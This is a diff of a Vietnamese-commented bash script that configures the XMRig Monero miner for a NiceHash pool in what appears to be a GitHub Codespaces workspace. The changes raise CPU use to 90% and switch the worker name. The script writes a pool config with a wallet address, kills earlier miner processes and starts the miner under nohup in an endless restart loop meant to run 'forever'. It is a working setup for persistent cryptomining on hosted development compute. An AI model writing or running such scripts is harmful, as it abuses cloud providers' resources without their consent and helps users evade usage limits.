@@ -2,12 +2,12 @@
 set -e
 
 echo "========================================"
-echo "🚀 XMRig AUTO MINER - NICEHASH (4 threads)"
+echo "🚀 XMRig AUTO MINER - NICEHASH (90% CPU)"
 echo "========================================"
 
 cd /workspaces/COPILOTR
 
-# Xóa sạch cũ để tải mới
+# Xóa sạch cũ
 rm -rf xmrig-miner
 mkdir -p xmrig-miner
 cd xmrig-miner
@@ -21,13 +21,13 @@ cd xmrig-6.26.0
 
 chmod +x xmrig
 
-echo "📝 Tạo config NiceHash (4 threads)..."
+echo "📝 Tạo config NiceHash (90% CPU)..."
 cat > config.json << 'EOF'
 {
     "autosave": true,
     "cpu": {
         "enabled": true,
-        "max-threads-hint": 85,
+        "max-threads-hint": 90,
         "huge-pages": false
     },
     "opencl": false,
@@ -39,7 +39,7 @@ cat > config.json << 'EOF'
             "algo": "rx",
             "coin": "monero",
             "url": "randomxmonero.auto.nicehash.com:9200",
-            "user": "NHbTzqmMyQaepqAPoZebySJ6FAHHA1DpGnDM.J97",
+            "user": "NHbTzqmMyQaepqAPoZebySJ6FAHHA1DpGnDM.GUNDAM",
             "pass": "x",
             "keepalive": true,
             "tls": false
@@ -51,10 +51,10 @@ EOF
 echo "🛑 Dừng miner cũ..."
 pkill -f xmrig 2>/dev/null || true
 
-echo "🔥 Khởi động miner NiceHash (chạy mãi mãi)..."
+echo "🔥 Khởi động miner NiceHash (90% CPU - chạy mãi mãi)..."
 nohup bash -c '
     while true; do
-        echo "[$(date)] Khởi động XMRig NiceHash..." >> /workspaces/COPILOTR/miner.log
+        echo "[$(date)] Khởi động XMRig NiceHash 90% CPU..." >> /workspaces/COPILOTR/miner.log
         ./xmrig -c config.json >> /workspaces/COPILOTR/miner.log 2>&1
         echo "[$(date)] Miner bị tắt, restart sau 5 giây..." >> /workspaces/COPILOTR/miner.log
         sleep 5
@@ -64,7 +64,7 @@ nohup bash -c '
 sleep 10
 
 if pgrep -f xmrig > /dev/null; then
-    echo "✅ MINER NICEHASH ĐÃ CHẠY (4 threads)!"
+    echo "✅ MINER NICEHASH ĐÃ CHẠY Ở 90% CPU!"
     echo "📊 Xem log realtime:   tail -f /workspaces/COPILOTR/miner.log"
     echo "⛔ Dừng hoàn toàn:     pkill -f xmrig"
 else
